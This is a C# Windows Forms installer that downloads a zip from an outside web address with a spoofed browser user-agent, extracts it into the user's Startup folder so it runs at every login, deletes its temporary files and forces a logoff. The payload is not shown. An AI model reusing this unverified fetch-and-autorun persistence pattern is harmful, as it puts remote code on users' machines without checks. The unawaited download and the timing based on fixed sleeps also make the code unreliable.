using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace gw_install
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            //progressBar1.Visible = false;
        }

        private void progressBar1_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            button1.Visible = false;
            progressBar1.Value = 0;
            System.Threading.Thread.Sleep(1000);
            //progressBar1.Visible = true;
            System.Threading.Thread.Sleep(500);
            // this is gathering directories where we want the thing installed to
            string userdir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            userdir += @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
            string progdir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            progdir += @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\";
            string gwcompatdir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            gwcompatdir += @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\compat";
            //string gwtarg = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            //gwtarg += @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\compat";
            string currentdir = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            // download files for the installation
            downloadGW();
            progressBar1.Value = 0;
            System.Threading.Thread.Sleep(4000);
            progressBar1.Value = 14;
            Console.WriteLine(userdir);
            Console.WriteLine(currentdir);
            System.Threading.Thread.Sleep(500);
            progressBar1.Value = 32;
            string zipPath = currentdir + @"\gw.zip";
            currentdir += @"\gw";
            // check if the extraction dir exists, if not then make it
            bool exists = System.IO.Directory.Exists(currentdir);
            if (!exists)
            {
                System.IO.Directory.CreateDirectory(currentdir);
            }
            /*bool exists2 = System.IO.Directory.Exists(gwtarg);
            if (!exists2)
            {
                System.IO.Directory.CreateDirectory(gwtarg);
            }*/
            Console.WriteLine(currentdir);
            progressBar1.Value = 54;
            System.Threading.Thread.Sleep(2000);
            extrGW(); // extract files, oh also the screaming there is where the files are copied the first time
            System.Threading.Thread.Sleep(500);
            CopyDirectory(currentdir, userdir, true); // AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            CopyDirectory(gwcompatdir, progdir, true); // move the compat folder up so it doesn't open the folder on startup, oops.
            System.Threading.Thread.Sleep(2000);
            progressBar1.Value = 78;
            System.Threading.Thread.Sleep(500);
            progressBar1.Value = 100;
            Console.WriteLine();
            Console.WriteLine();
            System.Threading.Thread.Sleep(4000);
            // get the dir of the zip and delete it
            string currentdir2 = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            string zipdir = currentdir2 + @"\gw.zip";
            File.Delete(zipdir);
            currentdir2 += @"\gw";
            // delete temp files, also the first placed compat folder so it doesn't open on start
            RecursiveDelete(new DirectoryInfo(currentdir2));
            RecursiveDelete(new DirectoryInfo(gwcompatdir));
            System.Threading.Thread.Sleep(4000);
            label1.Text = "Thank you.";
            label2.Text = "Please log-out and log-in again\nto complete the installation process.";
            progressBar1.Visible = false;
            button2.Enabled = true;
            button2.Visible = true;
            //System.Windows.Forms.Application.Exit();
        }
        // exit and logout to properly start program installed
        private void button2_Click(object sender, EventArgs e)
        {
            /*string currentdir = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            string zipdir = currentdir + @"\gw.zip";
            File.Delete(zipdir);
            currentdir += @"\gw";
            RecursiveDelete(new DirectoryInfo(currentdir));*/
            ExitWindowsEx(0 | 0x00000004, 0);
            System.Windows.Forms.Application.Exit();
        }
        // copy dirs during install process
        static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            // Get information about the source directory
            var dir = new DirectoryInfo(sourceDir);

            // Check if the source directory exists
            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

            // Cache directories before we start copying
            DirectoryInfo[] dirs = dir.GetDirectories();

            // Create the destination directory
            Directory.CreateDirectory(destinationDir);

            // Get the files in the source directory and copy to the destination directory
            foreach (FileInfo file in dir.GetFiles())
            {
                try
                {
                    string targetFilePath = Path.Combine(destinationDir, file.Name);
                    file.CopyTo(targetFilePath);
                }
                catch (IOException) { }
            }

            // If recursive and copying subdirectories, recursively call this method
            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }
        // delete temp files
        public static void RecursiveDelete(DirectoryInfo baseDir)
        {
            if (!baseDir.Exists)
                return;

            foreach (var dir in baseDir.EnumerateDirectories())
            {
                RecursiveDelete(dir);
            }
            baseDir.Delete(true);
        }
        // download the files to install
        private static void downloadGW()
        {
            WebClient webClient = new WebClient();
            webClient.Headers.Add("Accept: text/html, application/xhtml+xml, */*");
            webClient.Headers.Add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36");
            webClient.DownloadFileAsync(new Uri("https://amongus.church/gw.zip"), "gw.zip");
        }
        // extract the files
        private static void extrGW()
        {
            System.Threading.Thread.Sleep(4000);
            string currentdir = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            string zipPath = currentdir + @"\gw.zip";
            string extractPath = currentdir + @"\gw";
            System.IO.Compression.ZipFile.ExtractToDirectory(zipPath, extractPath);
        }
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool ExitWindowsEx(uint uFlags, uint dwReason);
        public static bool WindowsLogOff()
        {
            return ExitWindowsEx(0, 0);
        }
    }
}
